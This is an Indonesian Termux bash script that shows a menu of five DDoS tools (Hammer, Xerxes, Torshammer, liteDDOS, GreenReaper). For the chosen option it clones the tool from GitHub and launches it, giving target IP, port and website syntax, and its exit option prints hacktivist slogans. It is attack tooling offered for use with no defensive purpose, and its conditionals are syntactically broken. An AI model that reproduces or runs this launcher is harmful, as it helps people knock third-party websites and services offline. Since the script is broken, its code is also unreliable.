#!/system/xbin/bash

echo "\033[33;1m[•]==============================[•]"

figlet "Rusmana"

echo "\033[33;1m[•]==============================[•]"
echo "" 

echo "\033[36;1mGua : Rusmana"

echo "\033[32;1mDari Team : TERMUX TOOLS-ID"

echo "\033[33;1mNomer Gua : 083879017166"

sleep 3

echo "\033[37;1mThanksTo:"

echo "\033[34;1mTeman-teman"

echo "\033[33;1m[+]==============================[+]"

date | lolcat

echo ""

sleep 1

echo "\033[36;1m Pilih Toolsnya Bro, Jangan Manja:v:"

echo "\033[33;1m[<=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=*[>"

sleep 1

echo "\033[32;1m1.> DDOS Hammer"

sleep 1

echo "\033[33;1m[<=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=*[>"

sleep 1

echo "\033[37;1m2.> DDOS Xerxes"

sleep 1

echo "\033[33;1m[<=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=*[>"

echo "\033[35;1m3.> DDOS Torshammer"

sleep 1

echo "\033[33;1m[<=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=*[>"

echo "\033[31;1m4.> DDOS liteDDOS"

sleep 1

echo "\033[33;1m[<=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=*[>"

echo "\033[36;1m5.> DDOS liteDDOS"

sleep 1

echo "\033[33;1m[<=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=*[>"


sleep 1

echo "\033[34;1m0.> keluar"

echo "\033[33;1m[<=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=*[>"

sleep 1

echo "\033[36;1mPilih Nomer Berapa ?==>"

echo "\033[33;1m[<=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*==*=*=*=*=*=*=*=*=*[>"

read bro


if [ $bro = 1 ] || [ $bro = 1 ]

pkg update

pkg upgrade

pkg install python

pkg install git

git clone https://github.com/cyweb/hammer

cd hammer

python hammer.py

python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)


[ $bro = 2 ] || [ $bro = 2 ]

apt install git

apt install clang

git clone https://github.com/zanyarjamal/xerxes

cd xerxes

clang xerxes.c -o xerxes

./xerxes (nama website) 80



if [ $bro = 3 ] || [ $bro = 3 ]

pkg update

pkg install git

apt install tor

pkg install python2

git clone https://github.com/dotfighter/torshammer.git

cd torshammer

python2 torshammer.py


if [ $bro = 4 ] || [ $bro = 4 ]

apt update

apt upgrade

pkg install git

pkg install python2

git clone https://github.com/4L13199/LITEDDOS

cd LITEDDOS

python2 liteDDOS.py


if [ $bro = 5 ] || [ $bro = 5 ]

apt upgrade && apt update -y

apt install git

apt install python2

git clone https://github.com/Amriez/GreenReaper

cd GreenReaper

python2 greenreaper.py



if [ $bro = 0 ] || [ $bro = 0 ]

then

echo "\033[31;1mWe Are SUICIDE CYBER SQUAD"

sleep 1

echo "\033[32;1mWe Are Anonymous"

sleep 1

echo "\033[37;1mWe Don't Illegal"

sleep 1

echo "\033[31;1mWe Kill All System"

sleep 1

echo "\033[33;1mExpect Us"

sleep 1

echo "\033[36;1And Respect Us"


sleep 1

echo "\033[34;1m From Zero To Hero"

sleep 1

exit

fi

